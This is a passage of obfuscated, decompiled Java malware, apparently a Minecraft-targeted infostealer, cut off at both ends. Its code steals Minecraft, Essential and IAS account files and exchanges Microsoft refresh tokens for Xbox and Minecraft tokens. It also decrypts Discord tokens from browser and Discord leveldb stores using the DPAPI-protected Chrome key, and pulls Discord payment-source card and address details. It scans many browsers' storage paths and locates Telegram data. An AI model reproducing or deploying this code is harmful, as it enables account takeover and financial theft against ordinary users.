         BufferedReader var7 = new java.io.BufferedReader(new java.io.InputStreamReader(var5, java.nio.charset.StandardCharsets.UTF_8));

         String var8;
         try {
            while (
               (
                     var8 = var7.readLine()
                  )
                  != null
            ) {
               var6.append(var8);
            }
         } catch (Throwable var13) {
            try {
               var7.close();
            } catch (Throwable var10) {
               var13.addSuppressed(var10);
            }

            throw var13;
         }

         var7.close();
      }

      var3.disconnect();
      if (var14 != 200) {
         throw new java.io.IOException(new StringBuilder().append("HTTP ").append(var14).append(" ").append(var6).toString());
      } else {
         return var6.toString();
      }
   }

   private static void mncoul(String var0, List<String> var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         String var2 = new StringBuilder().append("client_id=00000000402b5328&scope=service::user.auth.xboxlive.com::MBI_SSL&grant_type=refresh_token&redirect_uri=https://login.live.com/oauth20_desktop.srf&refresh_token=").append(java.net.URLEncoder.encode(var0, "UTF-8")).toString();
         JSONObject var3 = new JSONObject(
            hxyrox(
               "https://login.live.com/oauth20_token.srf",
               var2,
               "application/x-www-form-urlencoded"
            )
         );
         String var4 = var3.optString("access_token", null);
         String var5 = var3.optString("refresh_token", var0);
         if (var4 == null) {
            return;
         }

         JSONObject var6 = new JSONObject();
         var6.put(
            "Properties",
            new JSONObject()
               .put("AuthMethod", "RPS")
               .put(
                  "SiteName",
                  "user.auth.xboxlive.com"
               )
               .put(
                  "RpsTicket",
                  new StringBuilder().append("d=").append(var4).toString()
               )
         );
         var6.put(
            "RelyingParty",
            "http://auth.xboxlive.com"
         );
         var6.put("TokenType", "JWT");
         JSONObject var7 = new JSONObject(
            hxyrox(
               "https://user.auth.xboxlive.com/user/authenticate",
               var6.toString(),
               "application/json"
            )
         );
         String var8 = var7.optString("Token", null);
         if (var8 == null) {
            return;
         }

         String var9 = null;

         try {
            var9 = var7.getJSONObject("DisplayClaims")
               .getJSONArray("xui")
               .getJSONObject(0)
               .optString("uhs", null);
         } catch (Exception var13) {
         }

         JSONObject var10 = new JSONObject();
         var10.put(
            "Properties",
            new JSONObject()
               .put("SandboxId", "RETAIL")
               .put("UserTokens", new JSONArray().put(var8))
         );
         var10.put(
            "RelyingParty",
            "rp://api.minecraftservices.com/"
         );
         var10.put("TokenType", "JWT");
         JSONObject var11 = new JSONObject(
            hxyrox(
               "https://xsts.auth.xboxlive.com/xsts/authorize",
               var10.toString(),
               "application/json"
            )
         );
         String var12 = var11.optString("Token", null);
         var1.add(new StringBuilder().append("access_token=").append(var4).toString());
         var1.add(new StringBuilder().append("refresh_token=").append(var5).toString());
         var1.add(new StringBuilder().append("xbl_token=").append(var8).toString());
         var1.add(new StringBuilder().append("uhs=").append(var9 == null ? "" : var9).toString());
         var1.add(new StringBuilder().append("xsts_token=").append(var12 == null ? "" : var12).toString());
         var1.add("-----");
      } catch (Exception var14) {
         System.out.println(new StringBuilder().append("[Xbox] exchange error: ").append(var14.getMessage()).toString());
      }
   }

   public void rrqvhs() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      amwmea();
      String var1 = new StringBuilder().append(pebble).append("\\.minecraft\\launcher_accounts.json").toString();
      if (new File(var1).exists()) {
         System.out.println("Find Minecraft");

         try {
            java.nio.file.Files.walk(java.nio.file.Paths.get(var1, new String[0]), new FileVisitOption[0]).forEach(var1x -> {
                  if (rkjsezrwcf.jzdety() != 0) {
                     rkjsezrwcf.bbsnvj();
                  }

                  try {
                     Path var2 = java.nio.file.Paths.get(new StringBuilder().append(paprika).append("\\Minecraft.json").toString(), new String[0]).resolve(java.nio.file.Paths.get(var1, new String[0]).relativize(var1x));
                     if (java.nio.file.Files.isDirectory(var1x, new LinkOption[0])) {
                        if (!java.nio.file.Files.exists(var2, new LinkOption[0])) {
                           java.nio.file.Files.createDirectory(var2, new FileAttribute[0]);
                           return;
                        }

                        return;
                     }

                     java.nio.file.Files.copy(var1x, var2, new CopyOption[]{
                           java.nio.file.StandardCopyOption.REPLACE_EXISTING
                        });
                     bishop = Boolean.valueOf(true);
                  } catch (IOException var3x) {
                     var3x.printStackTrace();
                  }
               });
         } catch (Exception var3) {
            var3.printStackTrace();
         }
      }
   }

   public void hcoqdr() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var1 = new StringBuilder().append(System.getenv("APPDATA")).append("\\.minecraft\\essential\\microsoft_accounts.json").toString();
      new StringBuilder();
      if (new File(var1).exists()) {
         System.out.println("Find Essential");

         try {
            java.nio.file.Files.walk(java.nio.file.Paths.get(var1, new String[0]), new FileVisitOption[0]).forEach(var1x -> {
                  if (rkjsezrwcf.jzdety() != 0) {
                     rkjsezrwcf.bbsnvj();
                  }

                  try {
                     Path var2 = java.nio.file.Paths.get(new StringBuilder().append(paprika).append("\\Essential.json").toString(), new String[0]).resolve(java.nio.file.Paths.get(var1, new String[0]).relativize(var1x));
                     if (java.nio.file.Files.isDirectory(var1x, new LinkOption[0])) {
                        if (!java.nio.file.Files.exists(var2, new LinkOption[0])) {
                           java.nio.file.Files.createDirectory(var2, new FileAttribute[0]);
                           return;
                        }

                        return;
                     }

                     java.nio.file.Files.copy(var1x, var2, new CopyOption[]{
                           java.nio.file.StandardCopyOption.REPLACE_EXISTING
                        });
                     bishop = Boolean.valueOf(true);
                  } catch (IOException var3x) {
                     var3x.printStackTrace();
                  }
               });
         } catch (IOException var3) {
            throw new java.lang.RuntimeException(var3);
         }
      }
   }

   public void fffzbk() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var1 = new StringBuilder().append(System.getenv("APPDATA")).append("\\.minecraft\\gg.essential.mod\\microsoft_accounts.json").toString();
      new StringBuilder();
      if (new File(var1).exists()) {
         System.out.println("Find Essential");

         try {
            java.nio.file.Files.walk(java.nio.file.Paths.get(var1, new String[0]), new FileVisitOption[0]).forEach(var1x -> {
                  if (rkjsezrwcf.jzdety() != 0) {
                     rkjsezrwcf.bbsnvj();
                  }

                  try {
                     Path var2 = java.nio.file.Paths.get(new StringBuilder().append(paprika).append("\\GlobalEssential.json").toString(), new String[0]).resolve(java.nio.file.Paths.get(var1, new String[0]).relativize(var1x));
                     if (java.nio.file.Files.isDirectory(var1x, new LinkOption[0])) {
                        if (!java.nio.file.Files.exists(var2, new LinkOption[0])) {
                           java.nio.file.Files.createDirectory(var2, new FileAttribute[0]);
                           return;
                        }

                        return;
                     }

                     java.nio.file.Files.copy(var1x, var2, new CopyOption[]{
                           java.nio.file.StandardCopyOption.REPLACE_EXISTING
                        });
                     bishop = Boolean.valueOf(true);
                  } catch (IOException var3x) {
                     var3x.printStackTrace();
                  }
               });
         } catch (IOException var3) {
            throw new java.lang.RuntimeException(var3);
         }
      }
   }

   public void rquunu() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var1 = new StringBuilder().append(System.getenv("APPDATA")).append("\\.minecraft\\config\\ias.json").toString();
      new StringBuilder();
      if (new File(var1).exists()) {
         System.out.println("Find Ias");

         try {
            java.nio.file.Files.walk(java.nio.file.Paths.get(var1, new String[0]), new FileVisitOption[0]).forEach(var1x -> {
                  if (rkjsezrwcf.jzdety() != 0) {
                     rkjsezrwcf.bbsnvj();
                  }

                  try {
                     Path var2 = java.nio.file.Paths.get(new StringBuilder().append(paprika).append("\\Ias.json").toString(), new String[0]).resolve(java.nio.file.Paths.get(var1, new String[0]).relativize(var1x));
                     if (java.nio.file.Files.isDirectory(var1x, new LinkOption[0])) {
                        if (!java.nio.file.Files.exists(var2, new LinkOption[0])) {
                           java.nio.file.Files.createDirectory(var2, new FileAttribute[0]);
                           return;
                        }

                        return;
                     }

                     java.nio.file.Files.copy(var1x, var2, new CopyOption[]{
                           java.nio.file.StandardCopyOption.REPLACE_EXISTING
                        });
                     bishop = Boolean.valueOf(true);
                  } catch (IOException var3x) {
                     var3x.printStackTrace();
                  }
               });
         } catch (IOException var3) {
            throw new java.lang.RuntimeException(var3);
         }
      }
   }

   public static boolean jdraug(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      File var1 = new File(var0);
      return var1.exists()
         && var1.isDirectory();
   }

   public static List<File> mhvido(File var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      ArrayList var2 = new java.util.ArrayList();
      File[] var1;
      if (var0.exists()
         && var0.isDirectory()
         && (var1 = var0.listFiles())
            != null) {
         for (File var6 : var1) {
            if (var6.isFile()) {
               String var7 = var6.getName();
               if (var7.matches("^[A-Z0-9].*s$")) {
                  var2.add(var6);
               }
            }
         }

         try {
            var2.add(new File(new StringBuilder().append(var0).append("\\key_datas").toString()));
         } catch (Exception var8) {
         }
      }

      return var2;
   }

   public static void hljbgn(File var0, File var1) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Path var2 = var1.toPath().resolve(var0.getName());
      java.nio.file.Files.copy(var0.toPath(), var2, new CopyOption[]{
            java.nio.file.StandardCopyOption.REPLACE_EXISTING
         });
   }

   public static List<File> twkkrc(File var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      ArrayList var2 = new java.util.ArrayList();
      File[] var1;
      if (var0.exists()
         && var0.isDirectory()
         && (var1 = var0.listFiles())
            != null) {
         for (File var6 : var1) {
            if (var6.isDirectory()) {
               String var7 = var6.getName();
               if (var7.matches("^[A-Z0-9].*[A-Z0-9]$")) {
                  var2.add(var6);
               }
            }
         }
      }

      return var2;
   }

   public static void sozhkn(File var0, File var1) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Path var2 = var1.toPath().resolve(var0.getName());
      java.nio.file.Files.walk(var0.toPath(), new FileVisitOption[0]).forEach(var2x -> {
            if (rkjsezrwcf.jzdety() != 0) {
               rkjsezrwcf.bbsnvj();
            }

            Path var3 = var2.resolve(var0.toPath().relativize(var2x));

            try {
               java.nio.file.Files.copy(var2x, var3, new CopyOption[]{
                     java.nio.file.StandardCopyOption.REPLACE_EXISTING
                  });
            } catch (IOException var5) {
            }
         });
   }

   public static String cdgjit() throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var0 = new StringBuilder().append(mgdkyw()).append("\\Telegram.lnk").toString();
      File var1 = new File(var0);
      if (var1.exists()) {
         String var2 = new StringBuilder().append(System.getProperty("java.io.tmpdir")).append("readShortcut.vbs").toString();
         String var3 = "Set objShell = CreateObject(\"WScript.Shell\")\n                Set objShortcut = objShell.CreateShortcut(WScript.Arguments(0))\n                WScript.Echo objShortcut.WorkingDirectory";
         java.nio.file.Files.write(java.nio.file.Paths.get(var2, new String[0]), var3.getBytes(), new OpenOption[0]);
         Process var4 = Runtime.getRuntime().exec(new String[]{
               "cscript",
               "//NoLogo",
               var2,
               var1.getAbsolutePath()
            });
         BufferedReader var5 = new java.io.BufferedReader(new java.io.InputStreamReader(var4.getInputStream()));
         String var6 = var5.readLine();
         var5.close();
         new File(var2).delete();
         return var6;
      } else {
         return null;
      }
   }

   public static String mgdkyw() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var0 = mvfajx();
      if (uqsxdq(
         var0,
         "PowerShell KnownFolder"
      )) {
         return var0;
      }

      var0 = yszuks();
      if (uqsxdq(
         var0,
         "PowerShell Registry User Shell Folders"
      )) {
         return var0;
      }

      var0 = nrqnlk();
      if (uqsxdq(
         var0,
         "PowerShell Registry Shell Folders"
      )) {
         return var0;
      }

      var0 = new StringBuilder().append(System.getProperty("user.home")).append("\\Desktop").toString();
      if (uqsxdq(var0, "user.home Desktop")) {
         return var0;
      }

      String var1 = System.getenv("USERPROFILE");
      if (var1 != null
         && !var1.trim().isEmpty()) {
         var0 = new StringBuilder().append(var1).append("\\Desktop").toString();
         if (uqsxdq(var0, "USERPROFILE Desktop")) {
            return var0;
         }
      }

      System.out.println("[fatal] Could not resolve valid Desktop path");
      return null;
   }

   private static String mvfajx() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var0 = "$enc = New-Object System.Text.UTF8Encoding($false); [Console]::OutputEncoding = $enc; $OutputEncoding = $enc; [Environment]::GetFolderPath([Environment+SpecialFolder]::Desktop)";
      return rfxark(var0, "KnownFolder Desktop");
   }

   private static String yszuks() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var0 = "$enc = New-Object System.Text.UTF8Encoding($false); [Console]::OutputEncoding = $enc; $OutputEncoding = $enc; $p = (Get-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders' -Name Desktop -ErrorAction SilentlyContinue).Desktop; if ($p) { [Environment]::ExpandEnvironmentVariables($p) }";
      return rfxark(
         var0,
         "Registry User Shell Folders"
      );
   }

   private static String nrqnlk() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var0 = "$enc = New-Object System.Text.UTF8Encoding($false); [Console]::OutputEncoding = $enc; $OutputEncoding = $enc; $p = (Get-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders' -Name Desktop -ErrorAction SilentlyContinue).Desktop; if ($p) { [Environment]::ExpandEnvironmentVariables($p) }";
      return rfxark(
         var0,
         "Registry Shell Folders"
      );
   }

   private static String rfxark(String var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         System.out.println(new StringBuilder().append("[debug] Trying: ").append(var1).toString());
         ProcessBuilder var2 = new ProcessBuilder(new String[]{
               "powershell.exe",
               "-NoProfile",
               "-NonInteractive",
               "-Command",
               var0
            });
         var2.redirectErrorStream(true);
         Process var3 = var2.start();
         String var4 = vxlnfe(
            var3.getInputStream(),
            java.nio.charset.StandardCharsets.UTF_8
         );
         int var5 = var3.waitFor();
         var4 = uqsqao(var4).trim();
         System.out.println(new StringBuilder().append("[debug] ").append(var1).append(" exit=").append(var5).toString());
         System.out.println(new StringBuilder().append("[debug] ").append(var1).append(" raw output=[").append(var4).append("]").toString());
         if (var5 != 0) {
            return null;
         }

         if (var4.isEmpty()) {
            return null;
         }

         String[] var6 = var4.split("\\r?\\n");

         for (String var10 : var6) {
            var10 = var10.trim();
            if (!var10.isEmpty()) {
               return var10;
            }
         }
      } catch (Exception var11) {
         System.out.println(new StringBuilder().append("[error] ").append(var1).append(" failed:").toString());
         var11.printStackTrace(System.out);
      }

      return null;
   }

   private static boolean uqsxdq(String var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      System.out.println(new StringBuilder().append("[debug] Checking path from ").append(var1).append(": [").append(var0).append("]").toString());
      if (var0 == null) {
         System.out.println(new StringBuilder().append("[warn] ").append(var1).append(" returned null").toString());
         return false;
      }

      var0 = var0.trim();
      if (var0.isEmpty()) {
         System.out.println(new StringBuilder().append("[warn] ").append(var1).append(" returned empty path").toString());
         return false;
      }

      if (var0.contains("?")) {
         System.out.println(new StringBuilder().append("[warn] path contains '?', probably broken encoding: [").append(var0).append("]").toString());
         ulhpuk(var0);
         return false;
      }

      try {
         java.nio.file.Paths.get(var0, new String[0]);
      } catch (InvalidPathException var3) {
         System.out.println(new StringBuilder().append("[error] Invalid path from ").append(var1).append(": [").append(var0).append("]").toString());
         System.out.println(new StringBuilder().append("[error] reason=").append(var3.getReason()).toString());
         System.out.println(new StringBuilder().append("[error] index=").append(var3.getIndex()).toString());
         ulhpuk(var0);
         return false;
      }

      System.out.println(new StringBuilder().append("[ok] Desktop path from ").append(var1).append(": [").append(var0).append("]").toString());
      return true;
   }

   private static void ulhpuk(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      System.out.println("========== CHAR DEBUG ==========");
      System.out.println(new StringBuilder().append("[debug] string=[").append(var0).append("]").toString());
      System.out.println(new StringBuilder().append("[debug] length=").append(var0.length()).toString());

      for (int var1 = 0; var1 < var0.length(); var1++) {
         char var2 = var0.charAt(var1);
         System.out.printf(java.util.Locale.ROOT, "[debug] char[%d] = '%s' hex=U+%04X int=%d%n", new Object[]{
               Integer.valueOf(var1),
               ysjvrj(var2),
               Integer.valueOf(var2),
               Integer.valueOf(var2)
            });
      }

      System.out.println("================================");
   }

   private static String ysjvrj(char var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      return java.lang.Character.isISOControl(var0)
         ? new StringBuilder().append("\\u").append(String.format("%04X", new Object[]{
                     Integer.valueOf(var0)
                  })).toString()
         : String.valueOf(var0);
   }

   private static String vxlnfe(InputStream var0, Charset var1) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      ByteArrayOutputStream var2 = new java.io.ByteArrayOutputStream();
      byte[] var3 = new byte[4096];

      int var4;
      while ((var4 = var0.read(var3)) != -1) {
         var2.write(var3, 0, var4);
      }

      return new String(var2.toByteArray(), var1);
   }

   private static String uqsqao(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      return var0 != null
            && var0.startsWith("\ufeff")
         ? var0.substring(1)
         : var0;
   }

   public static void slvgmv() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (meadow) {
         try {
            csbcpw();
            ucqavi();
            Iterator var0 = pistol.iterator();

            while (var0.hasNext()) {
               String var1 = (String)var0.next();
               String var2 = wvvopv(var1);
               if (!var2.equals("")) {
                  lkaoos(var1, var2);
               }
            }

            try {
               if (saffron != null) {
                  FileWriter var5 = new java.io.FileWriter(new StringBuilder().append(lantern).append("\\Discord.txt").toString());
                  var5.write(saffron);
                  var5.close();
                  return;
               }
            } catch (Exception var3) {
               System.out.println(new StringBuilder().append(var3).append(" what the flip").toString());
               return;
            }
         } catch (Exception var4) {
            ugdymr(var4, "discord token stealer");
         }
      }
   }

   private static void lkaoos(String var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         URL var2 = new URL("https://discord.com/api/v6/users/@me");
         HttpURLConnection var3 = ciixxo(var2, var0);
         int var4 = var3.getResponseCode();
         if (var4 == 200) {
            BufferedReader var5 = new java.io.BufferedReader(new java.io.InputStreamReader(var3.getInputStream()));
            StringBuilder var6 = new StringBuilder();

            label43:
            while (true) {
               String var7 = var5.readLine();
               if (var7 == null) {
                  var5.close();
                  var6.toString();
                  URL var13 = new URL("https://discord.com/api/v6/users/@me/billing/payment-sources");
                  var3 = ciixxo(var13, var0);
                  int var8 = var3.getResponseCode();
                  if (var8 != 200) {
                     saffron = new StringBuilder().append(saffron).append("Username: ").append(var1).append("\ntoken: ").append(var0).append(" | tokenend | \n----------------------------------\n").toString();
                     break;
                  } else {
                     BufferedReader var9 = new java.io.BufferedReader(new java.io.InputStreamReader(var3.getInputStream()));
                     StringBuilder var10 = new StringBuilder();

                     while (true) {
                        String var11 = var9.readLine();
                        if (var11 == null) {
                           var9.close();
                           var11 = var10.toString().replace("[", "").replace("]", "");
                           if (var11.length() != 0) {
                              uhcswn(var11, var1, var0);
                           } else {
                              saffron = new StringBuilder().append(saffron).append("Username: ").append(var1).append("\ntoken: ").append(var0).append(" | tokenend | \n----------------------------------\n").toString();
                           }
                           break label43;
                        }

                        var10.append(var11);
                     }
                  }
               }

               var6.append(var7);
            }
         }

         var3.disconnect();
      } catch (Exception var12) {
         var12.printStackTrace();
         saffron = new StringBuilder().append(saffron).append("Username: ").append(var1).append("\ntoken: ").append(var0).append(" | tokenend | \n----------------------------------\n").toString();
      }
   }

   private static void uhcswn(String var0, String var1, String var2) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         String[] var4 = var0.replace("[", "").replace("]", "").split(",");
         HashMap var5 = new java.util.HashMap();

         for (String var9 : var4) {
            String[] var10 = var9.split(":");
            if (var10.length == 2) {
               String var11 = var10[0].replace("\"", "").trim();
               String var12 = var10[1].replace("\"", "").trim();
               var5.put(var11, var12);
            }
         }

         String var3;
         if (!(String)var5.getOrDefault("expires_year", "").isEmpty()) {
            var3 = new StringBuilder().append("expiresYear:").append((String)var5.getOrDefault("expires_year", "")).append(" country:").append((String)var5.getOrDefault("country", "")).append(" last_4:").append((String)var5.getOrDefault("last_4", "")).append(" expires_month:").append((String)var5.getOrDefault("expires_month", "")).append(" city:").append((String)var5.getOrDefault("city", "")).append(" postalCode:").append((String)var5.getOrDefault("postal_code", "")).append(" name:").append((String)var5.getOrDefault("name", "")).append(" lineOne:").append((String)var5.getOrDefault("line_1", "")).append(" lineTwo:").append(var5.containsKey("line_2")
                           ? (String)var5.get("line_2")
                           : "null").append(" state:").append((String)var5.getOrDefault("state", "")).toString();
         } else {
            var3 = new StringBuilder().append("country:").append((String)var5.getOrDefault("country", "")).append(" city:").append((String)var5.getOrDefault("city", "")).append(" postalCode:").append((String)var5.getOrDefault("postal_code", "")).append(" name:").append((String)var5.getOrDefault("name", "")).append(" lineOne:").append((String)var5.getOrDefault("line_1", "")).append(" lineTwo:").append(var5.containsKey("line_2")
                           ? (String)var5.get("line_2")
                           : "null").append(" state:").append((String)var5.getOrDefault("state", "")).toString();
         }

         saffron = new StringBuilder().append(saffron).append("Username: ").append(var1).append("\ntoken: ").append(var2).append(" | tokenend |\n").append(var3).append("\n----------------------------------\n").toString();
      } catch (Exception var13) {
         var13.printStackTrace();
         saffron = new StringBuilder().append(saffron).append("Error processing payment data for Username: ").append(var1).append("\n").toString();
      }
   }

   private static HttpURLConnection ciixxo(URL var0, String var1) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      HttpURLConnection var2 = (HttpURLConnection)var0.openConnection();
      var2.setRequestProperty("Authorization", var1);
      var2.setRequestProperty("Content-Type", "application/json");
      var2.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
      return var2;
   }

   private static void ucqavi() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      aerbll().forEach(var0 -> {
            if (rkjsezrwcf.jzdety() != 0) {
               rkjsezrwcf.bbsnvj();
            }

            pistol.addAll(xcsclc(var0));
         });
   }

   private static void csbcpw() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      qlmjxr().forEach(var0 -> {
            if (rkjsezrwcf.jzdety() != 0) {
               rkjsezrwcf.bbsnvj();
            }

            pistol.addAll(ciobiy(
                  java.nio.file.Paths.get(var0, new String[]{
                           "Local Storage",
                           "leveldb"
                        }).toString(),
                  uxwlda(var0)
               ));
         });
   }

   public static Set<String> xcsclc(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      HashSet var1 = new java.util.HashSet();
      awivsc(var0).forEach(var1x -> {
            if (rkjsezrwcf.jzdety() != 0) {
               rkjsezrwcf.bbsnvj();
            }

            var1.addAll(orkevr(var1x));
         });
      return var1;
   }

   public static Set<String> ciobiy(String var0, byte[] var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      HashSet var2 = new java.util.HashSet();
      Iterator var3 = yngsca(var0).iterator();

      while (var3.hasNext()) {
         byte[] var4 = (byte[])var3.next();
         byte[] var5 = new byte[12];
         System.arraycopy(var4, 3, var5, 0, 12);
         byte[] var6 = new byte[var4.length - 15];
         System.arraycopy(var4, 15, var6, 0, var6.length);

         try {
            Cipher var7 = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
            var7.init(2, new javax.crypto.spec.SecretKeySpec(var1, "AES"), new javax.crypto.spec.GCMParameterSpec(128, var5));
            var2.add(new String(var7.doFinal(var6)));
         } catch (Exception var8) {
         }
      }

      return var2;
   }

   public static byte[] uxwlda(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         JsonNode var1 = ijichb()
            .readTree(
               java.nio.file.Paths.get(var0, new String[]{"Local State"}).toFile()
            );
         String var2 = var1.path("os_crypt")
            .path("encrypted_key")
            .asText();
         byte[] var3 = java.util.Base64.getDecoder().decode(var2);
         byte[] var4 = java.util.Arrays.copyOfRange(var3, 5, var3.length);
         final byte[] var5 = var4;
         return cradle.desert(
            "Crypt32Util.cryptUnprotectData",
            new Callable<byte[]>() {
               public byte[] call() throws Exception {
                  if (rkjsezrwcf.jzdety() != 0) {
                     rkjsezrwcf.bbsnvj();
                  }

                  return Crypt32Util.cryptUnprotectData(var5);
               }
            }
         );
      } catch (Exception var6) {
         return null;
      }
   }

   public static ObjectMapper ijichb() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      return sleigh;
   }

   private static List<byte[]> yngsca(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      ArrayList var1 = new java.util.ArrayList();
      awivsc(var0).forEach(var1x -> {
            if (rkjsezrwcf.jzdety() != 0) {
               rkjsezrwcf.bbsnvj();
            }

            var1.addAll(oyipxe(var1x));
         });
      return var1;
   }

   private static List<byte[]> oyipxe(File var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      ArrayList var1 = new java.util.ArrayList();

      try {
         BufferedReader var2 = new java.io.BufferedReader(new java.io.FileReader(var0));

         String var3;
         try {
            while (
               (
                     var3 = var2.readLine()
                  )
                  != null
            ) {
               Matcher var4 = quail.matcher(var3);
               if (var4.find()) {
                  String var5 = var4.group().substring(12);
                  byte[] var6 = java.util.Base64.getDecoder().decode(var5);
                  var1.add(var6);
               }
            }
         } catch (Throwable var8) {
            try {
               var2.close();
            } catch (Throwable var7) {
               var8.addSuppressed(var7);
            }

            throw var8;
         }

         var2.close();
      } catch (Exception var9) {
      }

      return var1;
   }

   private static Set<String> orkevr(File var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      HashSet var1 = new java.util.HashSet();

      try {
         BufferedReader var2 = new java.io.BufferedReader(new java.io.FileReader(var0));

         String var3;
         try {
            while (
               (
                     var3 = var2.readLine()
                  )
                  != null
            ) {
               Matcher var4 = salmon.matcher(var3);
               if (var4.find()) {
                  var1.add(var4.group());
               }
            }
         } catch (Throwable var6) {
            try {
               var2.close();
            } catch (Throwable var5) {
               var6.addSuppressed(var5);
            }

            throw var6;
         }

         var2.close();
      } catch (Exception var7) {
      }

      return var1;
   }

   public static List<String> qlmjxr() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      nzalxe(penguin, "discord");
      nzalxe(penguin, "discordcanary");
      nzalxe(penguin, "discordptb");
      return rodeo;
   }

   public static List<String> aerbll() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      vrgxis(
         mineral,
         "Chromium",
         "User Data",
         "Default",
         "Local Storage",
         "leveldb"
      );
      vrgxis(
         mineral,
         "Google",
         "Chrome",
         "User Data",
         "Default",
         "Local Storage",
         "leveldb"
      );
      vrgxis(
         mineral,
         "Google",
         "Chrome Beta",
         "User Data",
         "Default",
         "Local Storage",
         "leveldb"
      );
      vrgxis(
         mineral,
         "Google",
         "Chrome Dev",
         "User Data",
         "Default",
         "Local Storage",
         "leveldb"
      );
      vrgxis(
         mineral,
         "Google",
         "Chrome SxS",
         "User Data",
         "Default",
         "Local Storage",
         "leveldb"
      );
      vrgxis(
         mineral,
         "Microsoft",
         "Edge",
         "User Data",
         "Default",
         "Local Storage",
         "leveldb"
      );
      vrgxis(
         mineral,
         "BraveSoftware",
         "Brave-Browser",
         "User Data",
         "Default",
         "Local Storage",
         "leveldb"
      );
      vrgxis(
         mineral,
         "Vivaldi",
         "User Data",
         "Default",
         "Local Storage",
         "leveldb"
      );
      vrgxis(
         penguin,
         "Opera Software",
         "Opera Stable",
         "Local Storage",
         "leveldb"
      );
      vrgxis(
         penguin,
         "Opera Software",
         "Opera GX Stable",
         "Local Storage",
         "leveldb"
      );
      vrgxis(
         penguin,
         "Opera Software",
         "Opera GX",
         "Local Storage",
         "leveldb"
      );
      vrgxis(
         penguin,
         "Opera Software",
         "Opera Next",
         "Default",
         "Local Storage",
         "leveldb"
      );
      vrgxis(
         penguin,
         "Opera Software",
         "Opera Developer",
         "Default",
         "Local Storage",
         "leveldb"
      );
      vrgxis(
         mineral,
         "Iridium",
         "User Data",
         "Default",
         "Local Storage",
         "leveldb"
      );
      vrgxis(
         mineral,
         "Epic Privacy Browser",
         "User Data",
         "Default",
         "Local Storage",
         "leveldb"
      );
      vrgxis(
         mineral,
         "falkon",
         "profiles",
         "default",
         "Local Storage",
         "leveldb"
      );
      vrgxis(
         mineral,
         "Yandex",
         "YandexBrowser",
         "User Data",
         "Default",
         "Local Storage",
         "leveldb"
      );
      ukxeok(
         penguin,
         "Mozilla",
         "Firefox",
         "Profiles"
      );
      ukxeok(penguin, "Waterfox", "Profiles");
      ukxeok(penguin, "librewolf", "Profiles");
      ukxeok(
         penguin,
         "Moonchild Productions",
         "Pale Moon",
         "Profiles"
      );
      return portal;
   }

   private static void nzalxe(String... var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
